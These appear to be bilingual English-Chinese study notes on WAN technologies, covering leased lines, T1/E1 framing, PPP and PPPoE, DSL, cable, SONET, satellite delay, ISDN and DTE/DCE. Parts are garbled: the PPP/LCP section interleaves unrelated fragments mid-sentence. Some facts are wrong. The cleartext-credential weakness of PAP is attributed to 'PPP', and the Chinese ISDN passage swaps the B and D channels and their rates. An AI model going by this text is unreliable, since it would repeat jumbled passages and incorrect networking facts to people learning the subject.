▸ With such an expansive existing infrastructure, electric power lines can be attractive candidates to provide broadband Internet access to residential locations.
▸ This is made possible with broadband over power lines (BPL)
technology.
▸ Although implementations vary widely, bandwidth offered to
an end user typically maxes out at approximately 2.7
Mbps.
- Although the physical media on a WAN closely resembles LAN
media, the Layer 2 protocols running over the media is usually different for WAN links, as opposed to LAN links.
Wireless Media
- Wireless media adds flexibility to WAN connections and often reduces cost.
- Some examples of wireless media include the following:
◦ Cellular phone:
▸ Some cellular-phone technologies (like Long-Term Evolution
(LTE), supports a 100-Mbps data rate to mobile devices and
a 1-Gbps data rate for stationary静止的 devices) can be used to connect a mobile device (like smart phone) to the Internet.
▸ tethering: term commonly used with today’s smart phones.
▸ allows a smart phone’s data connection to be used by another
•
device, such as a laptop.
Internet connection sharing (ICS):
◦ sometimes used interchangeably with the term
tethering.
◦ However, ICS is a Microsoft Windows solution
◦ allowing a Microsoft Windows-based computer with
an Internet connection (possibly via an internal cellular data card) to share its connection with other devices.
▸ Also, mobile hot spots:
- these devices connect to a cell phone company’s data
network and make that data network available to nearby devices (typically maximum of five devices) via wireless networking technologies.
- allows multiple passengers in a car to share a mobile hot spot and have Internet connectivity from their laptops when riding down the road. ◦ Satellite:
▸ Some locations do not have WAN connectivity options, such
as DSL connections or cable modems, commonly available
in urban areas.
▸ However, these locations might be able to connect to the
Internet, or to a remote office, using satellite
communications
▸ transmission is bounced off of a satellite, received by a satellite ground station, and then sent to its destination using either another satellite hop or a wired WAN connection.
◦ Worldwide Interoperability for Microwave Access (WiMAX):
▸ provides wireless broadband access to fixed locations (as an alternative to technologies such as DSL) and mobile devices.
▸ Depending on the WiMAX service provider, coverage areas could encompass entire cities or small countries. (50km)
◦ Evolved High-Speed Packet Access (HSPA+):
▸ Like WiMAX, Evolved High-Speed Packet Access (HSPA+) is a technology offering wireless broadband service. The maximum data rate for HSPA+ is 84 Mbps.
◦ Radio:
▸ The range of frequencies (measured in Hertz [Hz], which represents the number of cycles of a waveform per second) typically considered to be in the radio frequency spectrum includes frequencies of 3 kHz through 300 GHz.
▸ Different countries have their own standards bodies that dictate which frequency ranges can be used for what purposes.
▸ Example:
- United States, the Federal Communications Commission
(FCC) regulates the use of frequencies in the radio
frequency spectrum.
▸ multiple radio-based WAN solutions exist, their
implementation might vary by country.
- A couple of potential downsides of wireless WAN media compared
with physical links.
◦ experiencing increased delay
◦ higher packet error rates. WAN Technologies
- The previous section presented a collection of WAN connection properties. Understanding these properties can now help you better understand the collection of WAN technologies presented in this section.
Dedicated Leased Line
- typically a point-to-point connection interconnecting two sites.
- All the bandwidth is available to those sites (unlike packet-switched
connection), does not need to share bandwidth among multiple
service provider customers.
- WAN technologies commonly used:
◦ digital circuits, such as T1, E1, T3, and E3 circuits.
▸ These circuits can use multiplexing technology to
simultaneously carry multiple conversations in different
64-kbps channels.
◦ A single 64-kbps channel is called a Digital Signal 0 (DS0).
◦ When one of these circuits comes into your location, it terminates
on a device called a channel service unit/data service unit
(CSU/DSU).
- Layer 2 protocol used on dedicated leased lines:
◦ Point-to-Point Protocol (PPP)
◦ High-Level Data Link Control (HDLC) ▸ less common, as compared to PPP
▸ HDLC lacks many of the features of PPP, and in its standards- based implementation, it can only support a single Layer 3 protocol on a circuit.
▸ However, Cisco has its own HDCL implementation in which the HDLC header has a protocol field, thus allowing the simultaneous transmission of multiple Layer 3 protocols.
T1 circuits
- were originally used in telephony networks, with the intent of one voice conversation being carried in a single channel (a single DS0).
- T1 circuit combines 24 DS0s (24 channels), or called a Digital Signal 1 (DS1), into a single physical connection to offer 1.544 Mbps of bandwidth,
◦ Nyquist Theorem: requires 8,000 samples to be sent per second for a voice conversation (that is, a rate at least twice the highest frequency of 4000 Hz). ◦ T1 frame size = 193 bits
▸ (24 channels * 8 bits per channel + 1 framing bit = 193 bits)
◦ Total bandwidth = 1.544 Mbps
▸ (193 bit frames * 8,000 samples per second).
◦ In a T1 environment, more than one frame is sent at once. Two popular approaches to grouping these frames together are the following:
▸ Super Frame (SF): Combines 12 standard 193-bblit frames. ▸ Extended Super Frame (ESF): Combines 24 standard 193-bit
frames.
- popular in North America and Japan.
E1 circuits
- An E1 circuit contains 32 channels.
◦ only 30 channels can transmit data/voice/ video.
◦ the 1st channels is reserved for framing and synchronization,
◦ the 17th channel is reserved for signaling (that is, setting up,
maintaining, and tearing down a call).
- E1 circuit has more DS0s than a T1, it has a higher bandwidth capacity.
◦ Nyquist Theorem: 8,000 samples per second
◦ bandwidth capacity = 2.048 Mbps
▸ (8000 samples * 8 bits per channels * 32 channels = 2,048,000 bits per second).
- Unlike a T1 circuit, an E1 circuit does not group frames together in a SF or an ESF.
◦ Rather, an E1 circuit groups 16 frames together in a multiframe. - popular outside of North America and Japan.
T3 circuits
- In the same T-carrier family of standards as a T1,
- a T3 circuit offers an increased bandwidth capacity.
◦ T1 circuit, 24 DS0s, 1.544 Mbps, Digital Signal 1 (DS1).
◦ T3 circuit, 672 DS0s, 44.7 Mbps, Digital Signal 3 (DS3).
E3 circuits
- available bandwidth:
◦ E3 circuit, 34.4 Mbps
◦ E1 circuit, 2.048 Mbps - T3(44.7 Mbps) > E3 (34.4 Mbps) > E1 (2.048 Mbps) > T1(1.544 Mbps)
CSU/DSU
- analog modems:模拟
◦ far less popular than they once were
◦ allowed phone line come in home/business and terminate on
analog modems, provided data connections for devices such as
PCs.
◦ supported a single data conversation per modem.
- digital modem:
◦ digital circuits (like T1, E1, T3, or T3 circuits) usually have multiple
data conversations multiplexed together on a single physical
connection. Therefore, a digital modem is needed.
◦ able to distinguish between data arriving on various DS0s.
- channel service unit/data service unit (CSU/DSU).
◦ CSU/DSU circuit can terminate an incoming digital circuit from a service provider and send properly formatted bits to a router.
◦ A CSU/ DSU uses clocking (often provided by the service provider) to determine when one bit stops and another bit starts. (Therefore, the circuit coming from a service provider and terminating on a CSU/DSU is a synchronous circuit.)
◦ Because a CSU/DSU works with bits, it is classified as a Layer 1 device.
Point-to-Point Protocol (PPP) [protocol]
- A common Layer 2 protocol used on dedicated leased lines is Point-to- Point Protocol (PPP).
◦ has the capability to simultaneously transmit multiple Layer 3 protocols (like IP and IPX) through the use of control protocols (CP).
▸ IP, example, uses the IP control protocol (IPCP).
▸ Each Layer 3 CP runs an instance 例子 of PPP’s Link Control
Protocol (LCP).
◦ PPP 協定主要運作於OSI 網路七層中的第二層 Data Link Layer (資
料連結層)。
◦ PPP 協定使用階層式的架構，可使用「同步實體媒介」、「非同步
實體媒介」、「整合服務數位網路(ISDN )」。 ◦ PPP 協定中的階層式架構主要分成兩層， ▸ 上層NCP(Network Control Protocol )
‧ 是負責認證等等的工作，並且與OSI 網路架構的第三層協同
運作。
‧ 因為NCP的緣故，PPP 協定才能與各種不同的網路協定整
合。
▸ 下層LCP(Link Control Protocol )。
‧ LCP 的主要工作是建立PPP協定的連線以及與連線相關的工
作
‧ 是負責建立資料連結的連線，PPP 協定提供不少種類的設定
給LCP ，以便建立資料連結的連線，主要用於協調點對 點的網路連線以及檢查網路封包訊框等等設定。
◦ Four primary features offered by LCP include the following:
◦ Authentication: 認證
▸ A device at one end of a PPP link can authenticate the device
at the other end of the link.
▸ 要求建立連線的一方(Caller )輸入與認證相關的資訊，例如
密碼等等。
▸ 目的是為了確認建立連線的一方有足夠的管理權限以便使用這
樣的PPP 連線。
‧ 主要工作內容:1. 要求密碼 2. 執行握手(Handshake) 過程
▸ Three approaches to perform PPP authentication: 運作的協定
- Password Authentication Protocol (PAP):
◦ one-way authentication (client authenticates with server)
◦ A significant drawback to PPP:
▸ other than its unidirectional authentication
▸ is the security vulnerability 弱点 of its clear text transmission of credentials, which could
permit an eavesdropper to learn the
authentication credentials being used.
- Challenge-Handshake Authentication Protocol (CHAP):
◦ one-way authentication.
◦ three-way handshake (challenge, response, and
acceptance messages) between a server and a
client.
▸ allows a client to be authenticated without •
‧
▸ 運作的協定:Multilink PPP(MLP)
These PPP features are optional and are not necessarily going to be
found in a given PPP connection.
PPP 協定的連線種類
◦ 基本上，廣域網路有Leased Line (專線)、Circuit Switched 和
Packet Switched 三種類型 3,019
◦
◦ ◦
◦
sending credential information across a
network.
- Microsoft Challenge-Handshake Authentication Protocol (MS- CHAP):
◦ a Microsoft-enhanced version of CHAP,
◦ offering a collection of additional features, including
two-way authentication.
Compression 壓縮
▸ 主要用來增加PPP連線的網路流量，透過壓縮來減少傳遞資料所需承
載的網路封包大小
▸ 主要工作內容:1. 在來源端壓縮資料2. 在目的端解壓縮資料
▸ 運作的協定:Stacker Predictor (Cisco 路由器一般會使用這兩種壓縮
協定)
Looped link detection:
▸ A Layer 2 loop (of PPP links) can be detected and prevented. Error detection: 錯誤偵測:
▸ Frames containing errors can be detected and discarded by PPP. 與眾多網路協定一樣，PPP 協定的連線也具備錯誤偵測的 功能
▸ 主要工作內容:1. 監視連線中被丟棄的資料 2. 避免訊框迴路
▸ 運作的協定:Quality Magic Number (確保比較穩定而且不會有網路
迴圈的資料傳輸) Multilink interface: 多連結
▸ allows multiple physical connections be bonded together into a logical interface.
•
This logical interface allows load balancing across multiple physical interfaces/
◦ Load balancing: 在具有相同路徑選擇時將網路流量平均分配 到這些網路路徑上，以便達到網路流量平均分攤的效 果，減少每一條網路路徑的負擔。 •
- •
◦ 而PPP 協定屬於Leased Line 或Circuit Switched 類型。
Point-to-Point Protocol over Ethernet
A popular WAN technology (specifically, an Internet access technology) in residences/businesses is digital subscriber line (DSL).
DSL connections use a variant of PPP called PPP over Ethernet (PPPoE).
◦ PPPoE is commonly used between a DSL modem in a home/ business and a service provider.
◦ PPPoE encapsulates PPP frames within Ethernet frames.
◦ PPP is used to leverage its features, such as authentication.
◦ Example:
▸ when you set up a DSL modem in your home, you typically have to provide authentication credentials.
▸ Although Ethernet does not handle authentication, PPP does. ▸ By combining Ethernet with PPP, Ethernet-based devices (like
PCs) can take advantage of PPP.
•
•
Microsoft RRAS (use PPP)
PPP is often the protocol used by Microsoft Routing and Remote
Access Server (RRAS):
◦ Before known as Microsoft RAS (Remote Access Server).
◦ a Microsoft Windows Server feature allows clients to remotely
access a Microsoft Windows network.
◦ Using PPP along with Microsoft RRAS allows support for PPP
features: Example:
◦ multilink interface feature:
▸ allow multiple dial-up modem connections be bonded together into a single logical connection client.
- PPP could be alternate by Serial Line Internet Protocol (SLIP).
◦ However, PPP is preferred over SLIP, because of it's features (like multilink interface and error detection).
- remote desktop control: An alternative to RRAS, where remote clients can become members of a Microsoft Windows network.
◦ With remote desktop control
▸ a remote computer does not directly become a member of an
internal network (like, a network inside a corporation). - But it controls a computer that is already part of an
internal network (could be any operating system (OS),
Microsoft Windows, Linux or Mac OS X).
▸ a remote user can see the screen of the internal computer and
control the computer with a keyboard and mouse.
▸ One example of a protocol that supports remote desktop control is Independent Computer Architecture (ICA),
which is a product of Citrix.
Digital Subscriber Line (DSL)
◦ Commonplace in many residential and small business locations
◦ a group of technologies that provide high-speed data transmission
over existing telephone wiring.
◦ has several variants (differ in data rates and distance limitations).
Three popular DSL variants:
- Asymmetric DSL (ADSL): 不对称的
◦ A popular Internet-access solution for residential.
▸ allows an existing analog telephone to share the same line used for data for simultaneous transmission of voice and data.
◦ Data rate: asymmetric: implies the upstream and downstream speeds can be different.
▸ Typically, downstream speeds > upstream speeds
- maximum downstream date rate: 8 Mbps
- maximum upstream date rate: 1.544 Mbps (the speed of a
T1 circuit).
◦ distance limitations: the maximum distance from a DSL modem to
a DSL access multiplexer (DSLAM) is 18,000 ft.
▸ limitation stems from procedure telephone company, used for
decades
▸ to change the impedance 阻抗 of telephone lines. ◦ reason:
▸ When wires in a telephone cable run side-by-side for several
thousand feet.
▸ capacitance 电容 builds up in the line (which can cause echo) ▸ To counteract the capacitance, after 18,000 ft. of cable,
telephone companies insert a load coil, adds inductance 自
感应 to the line. inductance is the opposite of capacitance.
▸ by adding a load coil, reduced the built-up capacitance in telephone cable.
▸ However, ADSL signals cannot cross a load coil, thus the 18,000 ft. distance limitation for ADSL.
◦ how a telephone line leaving a residence terminates on a DSLAM.
▸ DSLAM:
- an aggregation point for multiple connections
- it connects to service provider’s router via ATM network
▸ The service provider:
- authentication server: authenticates user credentials,
provided via PPPoE.
- DHCP server: hand out IP address information to devices
(like PC or wireless router connected to a DSL
modem).
◦ Dynamic Host Configuration Protocol (DHCP)
- Symmetric DSL (SDSL):
◦ Distinction between ADSL and SDSL:
▸ SDSL has symmetric (equal) upstream and downstream speeds.
▸ SDSL does not allow simultaneous transmission同时 of voice and data on the same phone line.
◦ less popular in residential, because an additional phone line is required for data.
◦ Data rate: (Although service providers vary)
▸ maximum upstream/downstream date rate: 1.168 Mbps.
◦ distance limitations: maximum distance 12,000 ft. between DSL modem and DSLAM.
- Very High Bit-Rate DSL (VDSL):
◦ VDSL boasts a much higher bandwidth capacity than ADSL or
SDSL
◦ Data rate: common downstream limit (52 Mbps), upstream limit
(12 Mbps)
◦ distance limitations: 4,000 ft. of telephone cable between a cable - HDSL:
modem and DSLAM.
▸ This constraint might seem too stringent from potential VDSL
subscribers to their closest telephone central office (CO). ▸ service providers and telephone companies offering VDSL service often extend their fiber-optic network into their
surrounding communities.
▸ This allows VDSL gateways to be located in multiple
communities.
▸ 4,000 ft. then becomes distance limitation between DSL
modem and the nearest VDSL gateway, increasing the number of potential VDSL subscribers. Cable Modem
- Cable television companies have a well-established and wide-reaching infrastructure for television programming.
- This infrastructure might contain both coaxial and fiber-optic cabling. Such infrastructure is called a hybrid fiber-coax (HFC) distribution network.
◦ These networks can designate specific frequency ranges for upstream and downstream data transmission.
◦ cable modem: The device located in a residence/business that can receive and transmit in those data frequency ranges.
- stream and downstream data frequency data:
◦ Upstream data frequencies: 5 MHz–42 MHz
◦ Downstream data frequencies: 50 MHz–860 MHz
- Although the theoretical maximum bandwidth limits are greater (dependent on the HFC distribution network in use), most upstream speeds are limited to 2 Mbps, downstream speeds limited to 10 Mbps.
- As HFC distribution networks continue to evolve, greater bandwidth capacities will be available.
◦ The frequencies dedicated to data transmission are specified by a
Data-Over-Cable Service Interface Specification (DOCSIS) version. Although DOCSIS is an international standard, European countries use their own set of frequency ranges, their own standard known as Euro-DOCSIS. Synchronous Optical Network (SONET)
- 同步光网络是使用光纤进行数字化信息通信的一个标准。为了传送大量 的电话和数据业务就开发了它用以替换准同步数字体系(SDH)系 统，它由Telcodia的GR-253-CORE定义。
- Layer 1 technology that uses fiber-optic cabling as its media.
◦ Layer 1 technology:
▸ it can be used to transport various Layer 2 encapsulation types, like Asynchronous Transfer Mode (ATM).
◦ fiber-optic:
▸ offers high data rates (155 Mbps–10 Gbps),
▸ and long-distance limitations (20 km–250 km)
- A SONET network can vary in its physical topology.
- Example:
◦ devices can connect as many as 16 devices in a linear fashion (similar to a bus topology) or in a ring topology.
◦ A metropolitan-area network (MAN) often uses a ring topology. ◦ The ring might circumnavigate a large metropolitan area.
◦ Sites within that metropolitan area could then connect to the
nearest point on the SONET ring.
- A SONET network uses a single wavelength of light, along with time- division multiplexing (TDM) to support multiple data flows on a single fiber.
- This approach differs from dense wavelength division multiplexing (DWDM),
◦ another high-speed optical network commonly used in MANs.
◦ DWDM uses as many as 32 light wavelengths on a single fiber,
◦ each wavelength can support as many as 160 simultaneous
transmissions.
- Another optical WAN technology to be aware of is passive optical network (PON):
◦ allows a single fiber cable to service as many as 128 subscribers.
◦ This is made possible via unpowered (that is, passive) optical
splitters.
- another fiber-optic multiplexing standard.
◦ SONET is often used synonymously with the term Synchronous Digital Hierarchy (SDH), ◦ Although these standards are similar, SONET is usually seen in North America, SDH has greater worldwide popularity.
Satellite
- Many rural locations lack the option of connecting to an IP WAN or to the Internet via physical media (like a DSL modem or a cable modem connection), a satellite WAN connection might be an option.
- Most satellites used for WAN connectivity are in orbit above the earth’s equator, about 22,300 miles high.
- Example:
◦ if a customer had a clear view of the sky
◦ customer install a satellite dish and establish a line-of-sight
communication path with the orbiting satellite.
◦ The satellite would then relay transmissions back and forth
between the customer’s site and the service provider’s ground
station.
◦ The ground station then provide connectivity to an IP WAN or to
the Internet via physical media.
- Two significant design considerations include the following:
◦ Delay:
▸ Radio waves travel at the speed of light, which is 186,000 miles per second, or 3 * 108 meters per second.
- This speed is specifically the speed of light (and radio waves) in a vacuum;
▸ however, for the purposes of this discussion, assume these commonly known values, even though, technically, the speed of light (and radio waves) is a bit slower when traveling through air, as opposed to traveling through a vacuum. Although these are fast speeds, consider the distance between a customer and the satellite. If a customer were located 2,000 miles north of the equator, the approximate distance between the customer site and the satellite could be calculated using the Pythagorean Theorem: d2=20002 + 22,3002. Solving the equation for d, which is the distance between the customer and the satellite, yields a result of approximately 22,390 miles.
A transmission from a customer to a destination on the Internet (or IP WAN) would have to travel from the customer to the satellite, from the satellite to the ground station, and then out to the Internet (or IP WAN). The propagation delay alone introduced by bouncing a signal off of the satellite is approximately 241 ms (that is, (22,390 * 2) / 186,000 = .241 seconds = 241 ms). And
to that, you have to add other delay components, such as processing delay (by the satellite and other networking devices), making the one-way delay greater than 1/4th of a second, and therefore the round-trip delay greater than 1/2 of a second. Such delays are not conducive to latency- sensitive applications, such as Voice over IP (VoIP).
◦ Sensitivity to weather conditions: Because communication between a cus- tomer’s satellite dish and an orbiting satellite must travel through the earth’s atmosphere, weather conditions can impede communications. example, if a thunderstorm is in the vicinity of the customer location, that customer might temporarily lose connectivity with her satellite. Based on these design considerations, even though satellite WAN technology offers tremendous flexibility in terms of geographical location, more terrestrial-based solutions are usually preferred.
Plain Old Telephone Service 普通老式电话服务
- The Public Switched Telephone Network (PSTN) is comprised of
multiple telephone carriers from around the world.
◦ An end-user location (home/business) gets to the PSTN by
connecting to its local telephone company / local exchange
carrier (LEC).
◦ Analog connections (both voice and data connections) via PSTN
are referred to as Plain Old Telephone Service (POTS)
connections.
◦ With PSTN, you can place a telephone call from and to anywhere
in the world. - Although the bandwidth available on the PSTN is limited, the PSTN is an expansive network, it is more likely to be available in a given location that other wired WAN solutions. So, the benefit of availability has the tradeoff of performance.
- A POTS connection can be used to access the Internet (or an IP WAN) ◦ connecting a computer to a modem with a serial cable.
◦ using a computer with an internal modem.
◦ connecting the modem to a POTS phone line, and dialing into a
service provider.
◦ The service provider then connects out to the Internet (or an IP
WAN).
- the performance of POTS connection (using a dial-up modem) is
limited.
◦ Although modems are rated as 56-kbps modems,
◦ in US and Canada, limitation to a modem’s data rate upstream
(48.0 kbps), downstream (53.3 kbps)
◦ limits not based on technical, but on countries commissions.
- common terms used for POTS connections (both voice and data)
- Telco:
◦ telephone company. Some countries have government-maintained telcos, while other countries have multiple competitive telcos.
- Local loop:
◦ connection between customer premise and local telephone central
office (CO).
- Central office (CO):
◦ A building containing a telephone company’s telephone switching
equipment.
◦ COs are categorized into five hierarchical classes.
▸ Class 1: a long-distance office serving a regional area.
▸ Class 2: a second-level long-distance office (it’s subordinate to
a Class 1 office).
▸ Class 3: a third-level long-distance office.
▸ Class 4: a fourth-level long-distance office, provides telephone
subscribers access to live operator.
▸ Class 5: the five-layer hierarchy, physically connects to
customer devices in the local area.
- Tip and ring
◦ The tip and ring wires are the red and green wires found in an RJ-11 wall jack, which carry voice, ringing voltage, and signaling information between an analog device (like a phone
or a modem) and a telephone’s wall jack. - Demarc
◦ A demarc (demarcation point/demarc extension) is the point in a telephone network where the maintenance responsibility passes from a telephone company to the subscriber (unless the subscriber has purchased inside wiring maintenance).
◦ This demarc is typically located in network interface device (NID), a box outside building.
- Smart jack
◦ a type of network interface device that adds circuitry. 电路
◦ This circuitry adds such features as converting between framing
formats on digital circuit (like a T1), supporting remote diagnostics, and regenerating a digital signal.
Integrated Services Digital Network (ISDN)
- a digital telephony technology that supports multiple 64-kbps channels (bearer channels [B channels]) on a single connection. Is Circuit-switched connection.
- was popular back in the 1980s and was used to connect private branch exchanges (PBX) (telephone switches owned/operated by a company) to a telephone central office (CO).
- has the capability to carry voice, video, or data over its B channels.
- also offers a robust set of signaling protocols:
◦ Q.921 for Layer 2 signaling and Q.931 for Layer 3 signaling.
◦ These signaling protocols run on a separate channel in an ISDN
circuit (delt/data channel [D channel]).
- ISDN circuits are classified as either BRI or PRI circuit:
◦ basic rate interface (BRI) circuit:
▸ contains two 64-kbps B channels and one 16-kbps D channel. ▸ Although such a circuit can carry two simultaneous 同时发生
的 voice conversations, the B channels can be logically bonded into a single VC (using the multilink interface feature of PPP) to offer a 128-kbps data path.
◦ primary rate interface (PRI) circuit:
▸ an ISDN circuit built on a T1 or E1 circuit.
- T1 circuit has 24 channels
◦ the ISDN PRI circuit:
◦ 23 B channels
◦ 24th D channel (64-kbps) ▸ the channel used to carry the Q.921 and Q.931 signaling protocols.
▸ used to set up, maintain, and tear down connections
- E1 circuit has 32 channels
◦ The ISDN PRI circuit: 30 B channels and one D
channel, which is the 17th channel.
◦ 1st channel being reserved for framing and
synchronization.
◦ 17th channel being served for signaling.
- Some ISDN circuits are four-wire circuits, while some are two-wire.
- some devices in an ISDN network might not natively be ISDN devices,
they might need to connect to a four-wire ISDN circuit or a two- wire ISDN circuit.
- ISDN Network Reference Points and Elements:
- R reference point: between a non-ISDN device and a terminal adapter
(TA).
- S/T reference point: between a network termination 1 (NT1) and a
terminal endpoint 1 (TE1).
- U reference point: between a network termination 1 (NT1) and the
wall jack connecting back to an ISDN service provider.
- Terminal adapter (TA): performs protocol conversion between a non-
ISDN device and a terminal endpoint 1 (TE1) device.
- Terminal endpoint 1 (TE1): a device that natively supports ISDN.
- Terminal endpoint 2 (TE2): a device that does not natively support
ISDN.
- Network termination 1 (NT1): a device that interconnects a four-wire
ISDN circuit and a two-wire ISDN circuit.
广域网连接按照连接方式可以分为如下三种: - 电路交换
◦ 主要特点:
◦ 要求在通信的双方之间建立一条实际的物理通路。
◦ 并且在整个通信过程中，这条通路被独占。
◦ 最普通的电路交换例子是电话系统，如PSTN(公共服务电话网)。
- 报文交换
◦ 存储交换的一种， ◦ 存储交换:指数据交换前，先通过缓冲存储器进行缓存，然后按队 列进行处理。
◦ “存储交换”分为“报文交换”(Message Switching)和“分组交换” (Packet Switching)。
◦ 报文交换的基本思想: 先将用户的报文存储在交换机的存储器中，当 所需要的输出电路空闲时，再将该报文发向接收交换机或用户终 端。
- 分组交换
◦ 此方式与报文交换类似，但报文被分成组传送，并规定了分组的最
大⻓度，到达目的地后需重新将分组组装成报文。 ◦ X.25和帧中继都使用这种交换技术
- 不同时期，不同的基础网络条件下 ISP(Internet service provider) 提供 给用户的几种不同的上网(Internet access)方式。
- 1. 拨号上网(Dial-up access)
◦ 依托于电信运营商传统的固定电话网络PSTN为用户提供Internet接
入。
◦ 配置的硬件:
▸ 拨号的用户，为计算机配置 Modem，调制解调器。
- 它负责将电脑的数字信号转换为可以在电话线上传输的模
拟信号。
- 在局端，也有对应的modem，再将模拟信号转换为数字信
号。
▸ 运营商来说，在局端配置 远程接入服务器 RAS(Remote access
server)，RAS和电话交换机通过Trunk接口(一般是E1，或者 是更高速的E3、STM1)进行连接，再通过其他的IP网络接口 把用户连接到互联网上。
◦ 这种方式使用的仍然是模拟信号，上下行带宽非对称(上行只有 33.6kbps)，而且上网时无法使用电话机通话。这种方式现在基 本已经淘汰了。
◦ 1.1 模拟线电话拨号
◦ 用户可以在自己的电脑上安装一个内置modem(插在电脑PCI插 ◦ 到电信局开通上网账号，然后就可以用电话线上网冲浪了 ▸ 拨号上网过程如下:
▸ 1.1.1:
- 拨一个号码如163，用户电话线会接入局端163网关， - 这个网关:
◦ 一个接口位于电话网络PSTN，用于终结 (termination)163电话;
◦ 另一个接口位于IP网络，通向Internet。
- 于是在用户电话与163网关之间就动态创建了一条虚拟电路
Virtual Circuit(VC) ▸ 1.1.2:
- 用户的拨号软件在VC上发PPP/LCP，
◦ 协商两端的MRU(Maximum Receive Unit)，
◦ 用何种认证方式(PAP or CHAP)来认证用户，
▸ 假定协商的认证方式为PAP(Passwood Authentication Protocol)。
▸ 1.1.3:
- 用户发 PPP/PAP + Password 来表明自己的身份，
- 网关成功认证用户，进入下一个阶段 PPP/IPCP。
▸ 1.1.4:
- PPP/IPCP (IP Control Protocol) : 用于给用户电脑分配IP地
址、网络掩码、缺省网关、首席DNS服务器、备份DNS
服务器.
- 完成此过程，用户就可以上网冲浪了。
◦ 至于双向的路由如何通:
▸ 在Internet世界，IP地址由谁来分配，谁就负责双
向的路由通达。
▸ 163网关来全权负责双向的路由的分发:
▸ 将分配给用户的IP汇总 IP summary prefix 通告给
Internet gateway，同时动态生成一条指向 用户 虚拟接口VA(Virtual Access)的一条主机(子 网掩码/32)路由，这个VA接口是PPP协议动态 创建的。这种上网带宽为 56 Kbps。 ◦ 1.2 数字线电话拨号 ISDN
▸ 此为数字线，所以不需要模数转换的modem，
▸ 提供B +2D 接入方式: 一条16Kbps 信令通道B，两条各 64 Kbps
数据通道D.
- 可以一条线路打电话，同时另一条上网;
- 也可以两条D通道都用于上网，即64 + 64=128 Kbps 的上网
带宽。
- 2. 宽带 DSL (Digital Subscriber Loop)
◦ 家用一般是 Asymmetric Digital Subscribe Line (ADSL)
(Asymmetric DSL 非对称数字用户环路)
◦ 由于可以提供上行/下行带宽不一样，下行带宽 大于 上行带宽，所
以称之为非对称。
◦ 仍然需要使用PSTN的线路来提供最后一公里的接入，提供的带宽较
大(一般从512K到8M)，所以也称为宽带拨号。
▸ 拨号的用户: 需要配置ADSL Modem
▸ 运营商: Broadband (Remote) Access Server (BRAS/BAS)
▸ ADSL采用的是频分技术，把上网的信号频率和电话通话的频率
      分开了，所以可以一边上网一边进行电话通话了。
◦ 由于Ethernet的简单易用、成本低廉， 慢慢脱颖而出, 广泛存在，成
为数据链路层最通用的接入技术。但现在电信运营商基本都在做 光纤网络改造，不久就会被GPON/EPON/FTTx 这些光纤上网 方式完全替代。
◦ 运营商想把Ethernet这种接入方式延伸到用户电脑，但是如何认证用 户呢?运营商有成熟的认证方案，已经用了很多年，就是用PPP 来认证用户。
▸ 问题来了，PPP是点对点协议，即会话的两端各有一台设备， 而Ethernet是多路访问，这是一个矛盾，如何在Ethernet这 个多路访问的二层介质上用PPP来认证客户端?
▸ 于是IETF发明了一个新的协议，PPP Over Ethernet (PPPoE) - 先将PPP帧封装在自己的体内，然后再用最外层的Ethernet
Header来封装PPPoE帧
- Ethernet Header + PPPoE + PPP - PPPoE 可以在用户电脑和PPPoE Server 之间，依靠 :
◦ PADI (discovery) / PADO (offer ) / PADR (request ) / PADS
(session confirm)来发现并建立一个点对点连接，如果: ▸ 2.1:
- PPPoE Server 与 PPP Server 位于同一台物理设备
- 则相当于用户电脑和PPP Server是点对点连接 ▸ 2.2:
- PPPoE Server 与 PPP Server 不在同一台物理设备，PPPoE Server 与 PPP Server 通过PPTP/L2TP隧道点对点连 接，
- 用户电脑和PPP Server是点对点连接
▸ 用户的PPP帧通过以上两种方式都到达了PPP Server，具体会话
方式参⻅1.1，不再重新叙述。完成所有协商，用户电脑可以
在互联网冲浪，带宽一般为512 Kbps 到10 Mbps 不等。
- 3. FTTH(EPON)
◦ FTTH(Fiber To The Home)，即光纤到户的缩写，这是一种接入 方式的泛称，并不是一种具体的接入技术，一般电信常用EPON (Ethernet Passive Optical Network)，即无源光网络。用光纤 作为物理传输介质，Ethernet 作为数据链路层，依靠PPPoE+ PPP来完成用户认证，并依靠PPP来封装用户 IP traffic
◦ 由于光纤相比于铜线，价格低、抗干扰、传输距离远，所以它的传 输带宽更高，家庭用户带宽一般为2M -100 Mbps，公司用户可 以使用1000 Mbps 的带宽。
- 4. 以太网接入(Ethernet access).
◦ 最后一种直接拉网线的方式 (非传统电信的ISP提供商运营商 提供的
上网方式)
◦ 因为本身不具备固定电话网络，所以直接采用目前最通用的以太网
接入的方式将用户连到Internet。
◦ 对于提供商来说，需要把以太网接入交换机部署到离用户尽量近的
地方(以太网线传输距离只有100m)，一般就是每栋楼放一个交换 机称为楼道交换机。这种方式现在也广泛存在，但也只能算是非 主流吧。 DTE.DCE
- 使用訊框中繼網路協定的硬體設備主要分成DTE和DCE兩種類型。
•
Data Terminal Equipment(DTE) 数据终端设备:
◦ DTE: 具有一定的数据处理和收发能力的设备，提供或接收数据.
◦ 例联接到调制解调器上的计算机就是一种DTE。
◦ 主要代表特定網路內的端節點，一般代表用戶端，例如(訊框中繼)存
取設備，簡稱FRADs(Frame Relay Access Devices)、router
或是橋接器等等。
◦ 串行V.24端口(25针)通常规定DTE:
▸ Pin 2: 作为TXD(发送数据线)，transmits.
▸ 第3根针脚为RXD(接收数据线)，
▸ 其余针脚为:7是信号地线，4是DTS，5是RTS，6是DTR，8是
DCD，以及包括发送时钟、接收时钟等等，都有规定具体的
针脚。
◦ DTE设备: router, PC, printer
Data Communications Equipment(DCE) 数据通讯
设备:
◦ 主要用途: 在網路內提供Clocking和Switching服務，它在DTE和传
   输线路之间提供信号变换和编码功能，并负责建立、保持和释放
链路的连接，如Modem。負責在廣域網路中傳遞資料。
◦ DCE设备通常是与DTE对接，因此针脚的分配相反:
▸ 也就是2是接收，Pin 3 transmits。
◦ DCE设备: CSU/DSU，广域网switch, modem、GV转换器等等传输
设备
•
- 它们之间的区别是DCE一方提供时钟，DTE不提供时钟，但它依靠DCE 提供的时钟工作，
- 比如PC机和MODEM之间。
◦ 数据传输通常是经过DTE-DCE,再经过DCE-DTE的路径。
◦ 其实对于标准的串行端口，通常从外观就能判断是DTE还是DCE，
DTE是针头(俗称公头)，DCE是孔头(俗称母头)，这样两 种接口才能接在一起。 - 比如一台路由器，它处于网络的边缘，它有一个S0口需要从另一台路由 器中学习到一些参数，具体实施时，我们就不需在这个S0口配“时钟 速率”，它从对方学到。这时它就是DTE，而对方就是DCE
- 当路由器作为DCE用来提供时钟频率时是需要设置的
